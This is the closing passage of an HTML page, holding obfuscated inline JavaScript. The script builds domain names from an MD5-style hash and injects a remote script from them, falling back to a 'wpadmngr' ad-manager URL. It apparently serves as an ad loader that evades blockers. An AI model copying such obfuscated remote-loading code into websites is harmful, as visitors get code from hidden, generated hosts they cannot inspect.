+0xc],0x6,0x655b59c3),X7=X0(X7,X4,X5,X6,X3[X2+0x3],0xa,-0x70f3336e),X6=X0(X6,X7,X4,X5,X3[X2+0xa],0xf,-0x100b83),X5=X0(X5,X6,X7,X4,X3[X2+0x1],0x15,-0x7a7ba22f),X4=X0(X4,X5,X6,X7,X3[X2+0x8],0x6,0x6fa87e4f),X7=X0(X7,X4,X5,X6,X3[X2+0xf],0xa,-0x1d31920),X6=X0(X6,X7,X4,X5,X3[X2+0x6],0xf,-0x5cfebcec),X5=X0(X5,X6,X7,X4,X3[X2+0xd],0x15,0x4e0811a1),X4=X0(X4,X5,X6,X7,X3[X2+0x4],0x6,-0x8ac817e),X7=X0(X7,X4,X5,X6,X3[X2+0xb],0xa,-0x42c50dcb),X6=X0(X6,X7,X4,X5,X3[X2+0x2],0xf,0x2ad7d2bb),X5=X0(X5,X6,X7,X4,X3[X2+0x9],0x15,-0x14792c6f),X4=U(X4,X8),X5=U(X5,X9),X6=U(X6,XX),X7=U(X7,XR);}return v(X4)+v(X5)+v(X6)+v(X7);},M=function(F){return r+'/'+q(n+':'+T+':'+F);},P=function(){var Xu=Xe;return r+'/'+q(n+':'+t+Xu(0xae));},J=document[Xe(0xa6)](Xe(0xaf));Xe(0xa8)in J?(L=L[Xe(0xa3)]('.js',Xe(0x9d)),J[Xe(0x91)]='module'):(L=L[Xe(0xa3)](Xe(0x9c),Xe(0xb4)),J[Xe(0xb3)]=!![]),N=q(n+':'+I+':domain')[Xe(0xa9)](0x0,0xa)+Xe(0x8a),r=Xe(0x92)+q(N+':'+I)[Xe(0xa9)](0x0,0xa)+'.'+N,J[Xe(0x96)]=M(L)+Xe(0x9c),J[Xe(0x87)]=function(){window[O]['ph'](M,P,N,n,q),window[O]['init'](h);},J[Xe(0xa2)]=function(){var XQ=Xe,F=document[XQ(0xa6)](XQ(0xaf));F['src']=XQ(0x98),F[XQ(0x99)](XQ(0xa0),h),F[XQ(0xb1)]='async',document[XQ(0x97)][XQ(0xab)](F);},document[Xe(0x97)][Xe(0xab)](J);}document['readyState']===XG(0xaa)||document[XG(0x9e)]===XG(0x8f)||document[XG(0x9e)]==='interactive'?K():window[XG(0xb7)](XG(0x8e),K);}()));function X(){var Xj=['addEventListener','onload','charAt','509117wxBMdt','.com','charCodeAt','split','988kZiivS','DOMContentLoaded','loaded','533092QTEErr','type','https://','6ebXQfY','toISOString','22mCPLjO','src','head','https://js.wpadmngr.com/static/adManager.js','setAttribute','per','length','.js','.m.js','readyState','2551668jffYEE','data-admpid','827096TNEEsf','onerror','replace','0123456789abcdef','909NkPXPt','createElement','2259297cinAzF','noModule','substring','complete','appendChild','1VjIbCB','loc',':tags','script','cks','async','10xNKiRu','defer','.l.js','469955xpTljk','ksu'];X=function(){return Xj;};return X();}</script>
	</div>
<script async defer src="/js/menu.js"></script>
</body>
</html>